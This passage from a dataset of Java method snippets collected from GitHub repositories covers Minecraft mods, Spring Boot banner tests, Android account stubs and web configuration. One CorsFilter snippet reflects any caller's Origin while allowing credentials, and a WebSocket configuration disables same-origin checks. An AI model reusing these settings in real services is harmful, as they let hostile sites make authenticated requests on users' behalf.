"https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/OakTanBarkBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30281, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/OakTanBarkBlock.java", "stars": "2", "class_props": {"extends": "FallingBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30282, "method_name": "reset", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid reset() {\n\t\tAnsiOutput.setEnabled(Enabled.DETECT);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30283, "method_name": "renderVersions", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderVersions() {\n\t\tResource resource = new ByteArrayResource(\n\t\t\t\t\"banner ${a} ${spring-boot.version} ${application.version}\".getBytes());\n\t\tString banner = printBanner(resource, \"10.2\", \"2.0\", null);\n\t\tassertThat(banner).startsWith(\"banner 1 10.2 2.0\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30284, "method_name": "renderWithoutVersions", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithoutVersions() {\n\t\tResource resource = new ByteArrayResource(\n\t\t\t\t\"banner ${a} ${spring-boot.version} ${application.version}\".getBytes());\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"banner 1  \");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30285, "method_name": "renderFormattedVersions", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderFormattedVersions() {\n\t\tResource resource = new ByteArrayResource(\n\t\t\t\t\"banner ${a}${spring-boot.formatted-version}${application.formatted-version}\".getBytes());\n\t\tString banner = printBanner(resource, \"10.2\", \"2.0\", null);\n\t\tassertThat(banner).startsWith(\"banner 1 (v10.2) (v2.0)\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30286, "method_name": "renderWithoutFormattedVersions", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithoutFormattedVersions() {\n\t\tResource resource = new ByteArrayResource(\n\t\t\t\t\"banner ${a}${spring-boot.formatted-version}${application.formatted-version}\".getBytes());\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"banner 1\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30287, "method_name": "renderWithColors", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithColors() {\n\t\tResource resource = new ByteArrayResource(\"${Ansi.RED}This is red.${Ansi.NORMAL}\".getBytes());\n\t\tAnsiOutput.setEnabled(AnsiOutput.Enabled.ALWAYS);\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"\\u001B[31mThis is red.\\u001B[0m\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30288, "method_name": "renderWithColorsButDisabled", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithColorsButDisabled() {\n\t\tResource resource = new ByteArrayResource(\"${Ansi.RED}This is red.${Ansi.NORMAL}\".getBytes());\n\t\tAnsiOutput.setEnabled(AnsiOutput.Enabled.NEVER);\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"This is red.\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30289, "method_name": "renderWith256Colors", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWith256Colors() {\n\t\tResource resource = new ByteArrayResource(\"${AnsiColor.208}This is orange.${Ansi.NORMAL}\".getBytes());\n\t\tAnsiOutput.setEnabled(AnsiOutput.Enabled.ALWAYS);\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"\\033[38;5;208mThis is orange.\\u001B[0m\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30290, "method_name": "renderWith256ColorsButDisabled", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWith256ColorsButDisabled() {\n\t\tResource resource = new ByteArrayResource(\"${AnsiColor.208}This is orange.${Ansi.NORMAL}\".getBytes());\n\t\tAnsiOutput.setEnabled(AnsiOutput.Enabled.NEVER);\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"This is orange.\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30291, "method_name": "renderWithTitle", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithTitle() {\n\t\tResource resource = new ByteArrayResource(\"banner ${application.title} ${a}\".getBytes());\n\t\tString banner = printBanner(resource, null, null, \"title\");\n\t\tassertThat(banner).startsWith(\"banner title 1\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30292, "method_name": "renderWithoutTitle", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithoutTitle() {\n\t\tResource resource = new ByteArrayResource(\"banner ${application.title} ${a}\".getBytes());\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"banner  1\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30293, "method_name": "printBanner", "class_name": "ResourceBannerTests", "params": ["Resource", "String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "\tprivate String printBanner(Resource resource, String bootVersion, String applicationVersion,\n\t\t\tString applicationTitle) {\n\t\tResourceBanner banner = new MockResourceBanner(resource, bootVersion, applicationVersion, applicationTitle);\n\t\tConfigurableEnvironment environment = new MockEnvironment();\n\t\tMap<String, Object> source = Collections.singletonMap(\"a\", \"1\");\n\t\tenvironment.getPropertySources().addLast(new MapPropertySource(\"map\", source));\n\t\tByteArrayOutputStream out = new ByteArrayOutputStream();\n\t\tbanner.printBanner(environment, getClass(), new PrintStream(out));\n\t\treturn out.toString();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30294, "method_name": "getBootVersion", "class_name": "MockResourceBanner", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "\t\tprotected String getBootVersion() {\n\t\t\treturn this.bootVersion;\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": "ResourceBanner", "implements": null, "modifiers": ["static"]}}, {"id": 30295, "method_name": "getApplicationVersion", "class_name": "MockResourceBanner", "params": ["Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "\t\tprotected String getApplicationVersion(Class<?> sourceClass) {\n\t\t\treturn this.applicationVersion;\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": "ResourceBanner", "implements": null, "modifiers": ["static"]}}, {"id": 30296, "method_name": "getApplicationTitle", "class_name": "MockResourceBanner", "params": ["Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "\t\tprotected String getApplicationTitle(Class<?> sourceClass) {\n\t\t\treturn this.applicationTitle;\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": "ResourceBanner", "implements": null, "modifiers": ["static"]}}, {"id": 30297, "method_name": "main", "class_name": "Demo03BufferedWriter", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {\n        //System.out.println();\n        //1.\u521b\u5efa\u5b57\u7b26\u7f13\u51b2\u8f93\u51fa\u6d41\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u9012\u5b57\u7b26\u8f93\u51fa\u6d41\n        BufferedWriter bw = new BufferedWriter(new FileWriter(\"10_IO\\\\c.txt\"));\n        //2.\u8c03\u7528\u5b57\u7b26\u7f13\u51b2\u8f93\u51fa\u6d41\u4e2d\u7684\u65b9\u6cd5write,\u628a\u6570\u636e\u5199\u5165\u5230\u5185\u5b58\u7f13\u51b2\u533a\u4e2d\n        for (int i = 0; i <10 ; i++) {\n            bw.write(\"\u4f20\u667a\u64ad\u5ba2\");\n            //bw.write(\"\\r\\n\");\n            bw.newLine();\n        }\n        //3.\u8c03\u7528\u5b57\u7b26\u7f13\u51b2\u8f93\u51fa\u6d41\u4e2d\u7684\u65b9\u6cd5flush,\u628a\u5185\u5b58\u7f13\u51b2\u533a\u4e2d\u7684\u6570\u636e,\u5237\u65b0\u5230\u6587\u4ef6\u4e2d\n        bw.flush();\n        //4.\u91ca\u653e\u8d44\u6e90\n        bw.close();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/17.%E3%80%90%E7%BA%BF%E7%A8%8B%E3%80%81%E5%90%8C%E6%AD%A5%E3%80%91-%E7%AC%94%E8%AE%B0/21.%E3%80%90%E7%BC%93%E5%86%B2%E6%B5%81%E3%80%81%E8%BD%AC%E6%8D%A2%E6%B5%81%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E3%80%81%E6%89%93%E5%8D%B0%E6%B5%81%E3%80%91-%E7%AC%94%E8%AE%B0/code/10_IO/src/com/itheima/demo01/BufferedStream/Demo03BufferedWriter.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30298, "method_name": "set", "class_name": "MutableCachingSupplier", "params": ["Supplier<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void set(Supplier<T> newSupplier) {\n\t\tsupplier = newSupplier;\n\t\tcache = null;\n\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/util/function/MutableCachingSupplier.java", "stars": "3", "class_props": {"extends": null, "implements": ["Supplier"], "modifiers": ["public"]}}, {"id": 30299, "method_name": "get", "class_name": "MutableCachingSupplier", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\tpublic T get() {\n\t\treturn cache == null ? cache = supplier.get() : cache;\n\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/util/function/MutableCachingSupplier.java", "stars": "3", "class_props": {"extends": null, "implements": ["Supplier"], "modifiers": ["public"]}}, {"id": 30300, "method_name": "doFilter", "class_name": "CorsFilter", "params": ["ServletRequest", "ServletResponse", "FilterChain"], "throws": ["IOException", "ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        HttpServletRequest request = (HttpServletRequest) servletRequest;\n        HttpServletResponse response = (HttpServletResponse) servletResponse;\n\n        response.setHeader(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, request.getHeader(HttpHeaders.ORIGIN));\n        response.setHeader(HttpHeaders.ACCESS_CONTROL_ALLOW_HEADERS, ALLOW_HEADERS);\n        response.setHeader(HttpHeaders.ACCESS_CONTROL_ALLOW_METHODS, \"GET, POST, PUT, DELETE, OPTIONS\");\n        response.setHeader(HttpHeaders.ACCESS_CONTROL_ALLOW_CREDENTIALS, \"true\");\n        response.setHeader(HttpHeaders.ACCESS_CONTROL_MAX_AGE, \"3600\");\n\n        if (!CorsUtils.isPreFlightRequest(request)) {\n            filterChain.doFilter(request, response);\n        }\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/core/CorsFilter.java", "stars": "1", "class_props": {"extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"id": 30301, "method_name": "getCurrentTime", "class_name": "PlaybackProgressChangedEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getCurrentTime() {\n        return currentTime;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/events/PlaybackProgressChangedEvent.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30302, "method_name": "getDuration", "class_name": "PlaybackProgressChangedEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getDuration() {\n        return duration;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/events/PlaybackProgressChangedEvent.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30303, "method_name": "get", "class_name": "ExpressionTemplateContext", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ExpressionTemplateContext", "snippet": "\tpublic static ExpressionTemplateContext get(){\n\t\treturn CONTEXT_THREAD_LOCAL.get();\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30304, "method_name": "remove", "class_name": "ExpressionTemplateContext", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void remove(){\n\t\tCONTEXT_THREAD_LOCAL.remove();\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30305, "method_name": "set", "class_name": "ExpressionTemplateContext", "params": ["ExpressionTemplateContext"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void set(ExpressionTemplateContext context){\n\t\tCONTEXT_THREAD_LOCAL.set(context);\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30306, "method_name": "set", "class_name": "ExpressionTemplateContext", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "ExpressionTemplateContext", "snippet": "\tpublic ExpressionTemplateContext set (String name, Object value) {\n\t\tfor (int i = scopes.size() - 1; i >= 0; i--) {\n\t\t\tMap<String, Object> ctx = scopes.get(i);\n\t\t\tif (ctx.isEmpty()) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (ctx.containsKey(name)) {\n\t\t\t\tctx.put(name, value);\n\t\t\t\treturn this;\n\t\t\t}\n\t\t}\n\n\t\tscopes.get(scopes.size() - 1).put(name, value);\n\t\treturn this;\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30307, "method_name": "setOnCurrentScope", "class_name": "ExpressionTemplateContext", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "ExpressionTemplateContext", "snippet": "\tpublic ExpressionTemplateContext setOnCurrentScope (String name, Object value) {\n\t\tscopes.get(scopes.size() - 1).put(name, value);\n\t\treturn this;\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30308, "method_name": "get", "class_name": "ExpressionTemplateContext", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object get (String name) {\n\t\tfor (int i = scopes.size() - 1; i >= 0; i--) {\n\t\t\tMap<String, Object> ctx = scopes.get(i);\n\t\t\tif (ctx.isEmpty()) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tObject value = ctx.get(name);\n\t\t\tif (value != null) {\n\t\t\t\treturn value;\n\t\t\t}\n\t\t}\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30309, "method_name": "getVariables", "class_name": "ExpressionTemplateContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "\tpublic Set<String> getVariables () {\n\t\tSet<String> variables = new HashSet<String>();\n\t\tfor (int i = 0, n = scopes.size(); i < n; i++) {\n\t\t\tvariables.addAll(scopes.get(i).keySet());\n\t\t}\n\t\treturn variables;\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30310, "method_name": "push", "class_name": "ExpressionTemplateContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void push () {\n\t\tMap<String, Object> newScope = freeScopes.size() > 0 ? freeScopes.remove(freeScopes.size() - 1) : new HashMap<String, Object>();\n\t\tscopes.add(newScope);\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30311, "method_name": "pop", "class_name": "ExpressionTemplateContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void pop () {\n\t\tMap<String, Object> oldScope = scopes.remove(scopes.size() - 1);\n\t\toldScope.clear();\n\t\tfreeScopes.add(oldScope);\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30312, "method_name": "configureInbound", "class_name": "WebsocketSecurityConfiguration", "params": ["MessageSecurityMetadataSourceRegistry"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void configureInbound(MessageSecurityMetadataSourceRegistry messages) {\n        messages\n            .nullDestMatcher().authenticated()\n            .simpDestMatchers(\"/topic/tracker\").hasAuthority(AuthoritiesConstants.ADMIN)\n            // matches any destination that starts with /topic/\n            // (i.e. cannot send messages directly to /topic/)\n            // (i.e. cannot subscribe to /topic/messages/* to get messages sent to\n            // /topic/messages-user<id>)\n            .simpDestMatchers(\"/topic/**\").authenticated()\n            // message types other than MESSAGE and SUBSCRIBE\n            .simpTypeMatchers(SimpMessageType.MESSAGE, SimpMessageType.SUBSCRIBE).denyAll()\n            // catch all\n            .anyMessage().denyAll();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/config/WebsocketSecurityConfiguration.java", "stars": "2", "class_props": {"extends": "AbstractSecurityWebSocketMessageBrokerConfigurer", "implements": null, "modifiers": ["public"]}}, {"id": 30313, "method_name": "sameOriginDisabled", "class_name": "WebsocketSecurityConfiguration", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean sameOriginDisabled() {\n        return true;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/config/WebsocketSecurityConfiguration.java", "stars": "2", "class_props": {"extends": "AbstractSecurityWebSocketMessageBrokerConfigurer", "implements": null, "modifiers": ["public"]}}, {"id": 30314, "method_name": "get", "class_name": "AccountManager", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "AccountManager", "snippet": "    public static AccountManager get(Context context) {\n        if (SDK >= 7) {\n            // The AccountManager does not have any bugs in API Level 7,\n            // so always use it to avoid the performance cost of parsing\n            // the manifest for database authenticators.\n            return new StandardAccountManager(context);\n        } else {\n            // Use DatabaseAccountManager for earlier platform versions.\n            // It will use a StandardAccountManager for API Level 5 and 6,\n            // unless there is a DatabaseAuthenticator that has indicated\n            // it should be used instead. DatabaseAuthenticators are always\n            // used on API Level 4 and earlier because StandardAccountManager\n            // is not supported.\n            return new DatabaseAccountManager(context);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30315, "method_name": "getAccountsByType", "class_name": "AccountManager", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "Account", "snippet": "    public abstract Account[] getAccountsByType(String type);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#getAccountsByTypeAndFeatures(String, String[], android.accounts.AccountManagerCallback, Handler)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30316, "method_name": "getAccountsByTypeAndFeatures", "class_name": "AccountManager", "params": ["String", "String", "AccountManagerCallback<Account>", "Handler"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "AccountManagerFuture<Account>", "snippet": "    public abstract AccountManagerFuture<Account[]> getAccountsByTypeAndFeatures(String type,\n            String[] features, AccountManagerCallback<Account[]> callback, Handler handler);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#addAccount(String, String, String[], Bundle, Activity, android.accounts.AccountManagerCallback, Handler)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30317, "method_name": "addAccount", "class_name": "AccountManager", "params": ["String", "String", "String", "Bundle", "Void", "AccountManagerCallback<Bundle>", "Handler"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "AccountManagerFuture<Bundle>", "snippet": "    public abstract AccountManagerFuture<Bundle> addAccount(String accountType,\n            String authTokenType, String[] requiredFeatures, Bundle addAccountOptions,\n            Void activity, AccountManagerCallback<Bundle> callback, Handler handler);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#addAccountExplicitly(android.accounts.Account, String, Bundle)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30318, "method_name": "addAccountExplicitly", "class_name": "AccountManager", "params": ["Account", "String", "Bundle"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "boolean", "snippet": "    public abstract boolean addAccountExplicitly(Account account, String password, Bundle extras);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#removeAccount(android.accounts.Account, android.accounts.AccountManagerCallback, Handler)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30319, "method_name": "removeAccount", "class_name": "AccountManager", "params": ["Account", "AccountManagerCallback<Boolean>", "Handler"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "AccountManagerFuture<Boolean>", "snippet": "    public abstract AccountManagerFuture<Boolean> removeAccount(Account account,\n            AccountManagerCallback<Boolean> callback, Handler handler);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#getAuthToken(android.accounts.Account, String, boolean, android.accounts.AccountManagerCallback, Handler)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30320, "method_name": "getAuthToken", "class_name": "AccountManager", "params": ["Account", "String", "boolean", "AccountManagerCallback<Bundle>", "Handler"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "AccountManagerFuture<Bundle>", "snippet": "    public abstract AccountManagerFuture<Bundle> getAuthToken(Account account,\n            String authTokenType, boolean notifyAuthFailure,\n            AccountManagerCallback<Bundle> callback, Handler handler);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#invalidateAuthToken(String, String)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30321, "method_name": "invalidateAuthToken", "class_name": "AccountManager", "params": ["String", "String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void invalidateAuthToken(String accountType, String authToken);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#blockingGetAuthToken(android.accounts.Account, String, boolean)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30322, "method_name": "blockingGetAuthToken", "class_name": "AccountManager", "params": ["Account", "String", "boolean"], "throws": ["AuthenticatorException", "IOException", "OperationCanceledException"], "modifiers": ["final", "public"], "return_type": "String", "snippet": "    public final String blockingGetAuthToken(Account account, String authTokenType,\n            boolean notifyAuthFailure) throws AuthenticatorException, IOException,\n            OperationCanceledException {\n        AccountManagerCallback<Bundle> callback = null;\n        Handler handler = null;\n        Bundle bundle = getAuthToken(account, authTokenType, notifyAuthFailure, callback, handler)\n                .getResult();\n        return bundle.getString(KEY_AUTHTOKEN);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30323, "method_name": "execute", "class_name": "TaskExecutor", "params": ["Runnable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void execute(Runnable r) {\n            new Thread(r).start();\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": ["Executor"], "modifiers": ["private", "static"]}}, {"id": 30324, "method_name": "postRunnableToHandler", "class_name": "BaseFutureTask", "params": ["Runnable"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void postRunnableToHandler(Runnable runnable) {\n            Handler handler = (mHandler == null) ? mMainHandler : mHandler;\n            